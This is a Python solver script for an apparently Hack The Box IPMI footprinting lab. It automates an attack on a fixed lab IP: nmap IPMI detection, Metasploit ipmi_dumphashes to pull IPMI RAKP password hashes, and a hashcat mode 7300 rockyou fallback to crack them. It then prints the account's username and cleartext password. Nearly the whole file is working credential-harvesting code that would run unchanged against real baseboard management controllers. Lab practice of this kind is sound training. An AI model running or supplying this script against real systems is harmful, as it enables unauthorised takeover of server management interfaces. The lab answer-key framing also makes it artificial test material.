#!/usr/bin/env python3
"""IPMI footprinting lab solver.

Questions:
  Q1: What username is configured for accessing the host via IPMI?
  Q2: What is the account's cleartext password?

Strategy:
  Phase 1 — Confirm IPMI on UDP/623 via nmap ipmi-version.
  Phase 2 — Run Metasploit ipmi_dumphashes with CRACK_COMMON true.
            MSF tries common passwords against retrieved RAKP hashes inline.
  Phase 3 — Parse username and cracked password from MSF output.
  Phase 4 — If not cracked by MSF, run hashcat -m 7300 with rockyou.txt.
"""
from __future__ import annotations

import argparse
import re
import subprocess
import sys
import tempfile
from pathlib import Path

_ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

sys.path.insert(0, str(Path(__file__).parent))

TARGET = "10.129.202.5"
PORT = 623
OUTPUT_DIR = Path("output/ipmi")


# ---------------------------------------------------------------------------
# Phase 1: Confirm IPMI
# ---------------------------------------------------------------------------

def confirm_ipmi(target: str, port: int = 623) -> bool:
    print(f"[*] Running nmap ipmi-version on {target}:UDP/{port} ...", file=sys.stderr)
    cmd = ["nmap", "-sU", "--script", "ipmi-version", f"-p{port}", "-Pn", target]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        output = proc.stdout + proc.stderr
        _save(target, "raw", "nmap_ipmi_version.txt", output)

        if re.search(r"623/udp\s+open", output, re.IGNORECASE):
            version_m = re.search(r"Version:\s*(\S+)", output, re.IGNORECASE)
            version = version_m.group(1) if version_m else "unknown"
            print(f"[+] IPMI detected — Version: {version}", file=sys.stderr)
            return True

        print("[-] IPMI not detected on UDP/623", file=sys.stderr)
        return False

    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(f"[-] nmap error: {e}", file=sys.stderr)
        return False


# ---------------------------------------------------------------------------
# Phase 2: Metasploit ipmi_dumphashes
# ---------------------------------------------------------------------------

def run_msf_dumphashes(target: str, port: int = 623) -> str:
    """Generate an RC file, run msfconsole, return combined output."""
    hashcat_file = OUTPUT_DIR / target / "hashes" / "ipmi_hashcat.txt"
    john_file = OUTPUT_DIR / target / "hashes" / "ipmi_john.txt"
    hashcat_file.parent.mkdir(parents=True, exist_ok=True)

    rc_lines = [
        "use auxiliary/scanner/ipmi/ipmi_dumphashes",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        "set CRACK_COMMON true",
        "set THREADS 1",
        f"set OUTPUT_HASHCAT_FILE {hashcat_file}",
        f"set OUTPUT_JOHN_FILE {john_file}",
        "run",
        "exit -y",
    ]

    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False, prefix="ipmi_") as rc_file:
        rc_file.write("\n".join(rc_lines) + "\n")
        rc_path = rc_file.name

    print(f"[*] Running msfconsole ipmi_dumphashes (CRACK_COMMON true) ...", file=sys.stderr)
    try:
        proc = subprocess.run(
            ["msfconsole", "-q", "-r", rc_path],
            capture_output=True, text=True, timeout=300,
        )
        output = proc.stdout + proc.stderr
        _save(target, "raw", "msf_ipmi_dumphashes.txt", output)
        return output
    except subprocess.TimeoutExpired:
        print("[-] msfconsole timed out after 300s", file=sys.stderr)
        return ""
    except FileNotFoundError:
        print("[-] msfconsole not found", file=sys.stderr)
        return ""


# ---------------------------------------------------------------------------
# Phase 3: Parse MSF output
# ---------------------------------------------------------------------------

def parse_msf_output(output: str) -> tuple[str | None, str | None]:
    """Extract (username, cracked_password) from MSF ipmi_dumphashes output."""
    # Hash found line — captures the username
    # Example: [+] 10.x.x.x - IPMI - Hash found: admin:...
    username: str | None = None
    cracked_password: str | None = None

    hash_re = re.compile(
        r"\[\+\]\s+\S+\s+-\s+IPMI\s+-\s+Hash found:\s*(\w+):",
        re.IGNORECASE,
    )
    # MSF CRACK_COMMON cracked line variants:
    cracked_re = re.compile(
        r"\[\+\]\s+\S+\s+-\s+IPMI\s+-\s+"
        r"Hash for user ['\"]?(\w+)['\"]?\s+matches dictionary password\s+['\"]?([^'\"\n]+)['\"]?",
        re.IGNORECASE,
    )
    cracked_alt_re = re.compile(
        r"\[\+\]\s+\S+\s+-\s+IPMI\s+-\s+(\w+):([^\s:]+)\s+\(cracked\)",
        re.IGNORECASE,
    )
    # Some versions print: [+] <ip> <port> - IPMI - Found plaintext password for admin: password123
    cracked_alt2_re = re.compile(
        r"\[\+\]\s+\S+.*?Found plaintext password\s+for\s+(\w+):\s*(\S+)",
        re.IGNORECASE,
    )

    for line in output.splitlines():
        m = hash_re.search(line)
        if m:
            username = m.group(1)

        m = cracked_re.search(line)
        if m:
            username = m.group(1)
            cracked_password = m.group(2).strip()

        m = cracked_alt_re.search(line)
        if m:
            username = m.group(1)
            cracked_password = m.group(2).strip()

        m = cracked_alt2_re.search(line)
        if m:
            username = m.group(1)
            cracked_password = m.group(2).strip()

    return username, cracked_password


# ---------------------------------------------------------------------------
# Phase 4: Hashcat fallback
# ---------------------------------------------------------------------------

def crack_with_hashcat(target: str, wordlist: Path | None = None) -> tuple[str | None, str | None]:
    """Try to crack IPMI hashes from the hashcat output file using hashcat."""
    hashcat_file = OUTPUT_DIR / target / "hashes" / "ipmi_hashcat.txt"
    if not hashcat_file.exists():
        print("[-] No hashcat file found, skipping hashcat fallback", file=sys.stderr)
        return None, None

    # Try common wordlist locations
    wl = wordlist
    if wl is None:
        for candidate in [
            Path("/usr/share/wordlists/rockyou.txt"),
            Path("/tmp/rockyou.txt"),
            Path("/usr/share/wordlists/fasttrack.txt"),
        ]:
            if candidate.exists():
                wl = candidate
                break
    if wl is None or not wl.exists():
        print(f"[-] No wordlist found for hashcat", file=sys.stderr)
        return None, None

    # MSF hashcat format: "10.x.x.x admin:<hash>:<hmac>"
    # Hashcat -m 7300 needs just "<hash>:<hmac>" without IP and username prefix.
    clean_hash_file = hashcat_file.parent / "ipmi_clean_hash.txt"
    raw_lines = hashcat_file.read_text(encoding="utf-8").splitlines()
    clean_lines = []
    hash_usernames: dict[str, str] = {}
    for line in raw_lines:
        line = line.strip()
        if not line:
            continue
        # Strip "IP username:" prefix, keep "<hash>:<hmac>"
        m = re.match(r"\S+\s+(\w+):(\S+)", line)
        if m:
            uname = m.group(1)
            hash_data = m.group(2)
            clean_lines.append(hash_data)
            hash_usernames[hash_data.split(":")[0][:16]] = uname
        else:
            clean_lines.append(line)
    clean_hash_file.write_text("\n".join(clean_lines) + "\n", encoding="utf-8")

    print(f"[*] Running hashcat -m 7300 with {wl.name} ...", file=sys.stderr)
    try:
        proc = subprocess.run(
            ["hashcat", "-m", "7300", str(clean_hash_file), str(wl), "--force", "-O"],
            capture_output=True, text=True, timeout=600,
        )
        _save(target, "raw", "hashcat_output.txt", proc.stdout + proc.stderr)

        # Run --show to get cracked results
        show_proc = subprocess.run(
            ["hashcat", "-m", "7300", str(clean_hash_file), "--show"],
            capture_output=True, text=True, timeout=30,
        )
        show_output = show_proc.stdout
        _save(target, "raw", "hashcat_show.txt", show_output)

        # --show format: "<hash>:<hmac>:<cracked_password>"
        for line in show_output.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.rsplit(":", 1)
            if len(parts) == 2:
                password = parts[-1].strip()
                if password:
                    # Match hash prefix to recover username
                    hash_prefix = parts[0].split(":")[0][:16]
                    extracted_username = hash_usernames.get(hash_prefix)
                    return extracted_username, password

    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(f"[-] hashcat error: {e}", file=sys.stderr)

    return None, None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _save(target: str, subfolder: str, filename: str, content: str) -> None:
    out_path = OUTPUT_DIR / target / subfolder / filename
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(content, encoding="utf-8")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve the HTB IPMI footprinting lab.")
    parser.add_argument("--target", default=TARGET)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--skip-discovery", action="store_true",
                        help="Skip nmap phase (assume IPMI is present)")
    parser.add_argument("--wordlist", default=None, help="Path to wordlist for hashcat fallback")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    target = args.target
    port = args.port

    print(f"\n=== IPMI Lab Solver — target {target}:UDP/{port} ===\n")

    # Phase 1
    if not args.skip_discovery:
        detected = confirm_ipmi(target, port)
        if not detected:
            print("\n[-] IPMI not detected. Use --skip-discovery to force enumeration.")
            return 1
    else:
        print("[*] Skipping IPMI discovery (--skip-discovery)", file=sys.stderr)

    # Phase 2
    msf_output = run_msf_dumphashes(target, port)
    # Strip ANSI escape codes before parsing
    msf_output_clean = _ANSI_ESCAPE.sub("", msf_output)

    # Phase 3
    username, cracked_password = parse_msf_output(msf_output_clean)

    if username:
        print(f"\n[+] Username found: {username}")
    else:
        print("\n[-] No username extracted from MSF output")

    if cracked_password:
        print(f"[+] Password cracked: {cracked_password}")
    else:
        print("[-] Password not cracked by MSF — trying hashcat fallback ...")
        wordlist = Path(args.wordlist) if args.wordlist else None
        hc_user, hc_pass = crack_with_hashcat(target, wordlist)
        if hc_pass:
            username = hc_user or username
            cracked_password = hc_pass
            print(f"[+] Hashcat cracked password: {cracked_password}")

    print(f"\nQ1 — Username:  {username or 'NOT FOUND'}")
    print(f"Q2 — Password:  {cracked_password or 'NOT FOUND'}")
    print()

    return 0 if (username and cracked_password) else 1


if __name__ == "__main__":
    sys.exit(main())
